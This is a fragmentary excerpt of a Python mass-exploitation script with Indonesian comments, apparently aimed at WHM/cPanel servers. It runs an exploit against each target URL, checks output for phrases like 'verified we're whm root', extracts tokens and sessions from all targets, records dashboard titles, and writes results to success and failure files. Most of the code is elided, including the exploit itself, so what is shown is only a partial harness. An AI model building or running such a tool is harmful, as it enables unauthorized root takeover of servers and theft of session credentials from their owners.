...
# Tambahan: Ekstrak token & session SEMUA target, ambil title dashboard
...
def run_single_exploit(target_url, idx, total):
    ...
    try:
        ...
        # ========== EKSTRAKSI TOKEN & SESSION (SELALU) ==========
        ...
        if "now just login" in output.lower() or "verified we're whm root" in output.lower():
            ...
            # TETAP CETAK TITLE (jika ada) UNTUK TARGET GAGAL
            if dashboard_title:
...
def main():
    ...
    # Clear output files
    for f in [OUTPUT_SUCCESS, OUTPUT_FAILED, OUTPUT_ALL, OUTPUT_TITLE]:
        open(f, "w").close()
    ...
    print(f"[*] Output files: {OUTPUT_SUCCESS}, {OUTPUT_FAILED}, {OUTPUT_ALL}, {OUTPUT_TITLE}")
    print("\n" + "="*60)
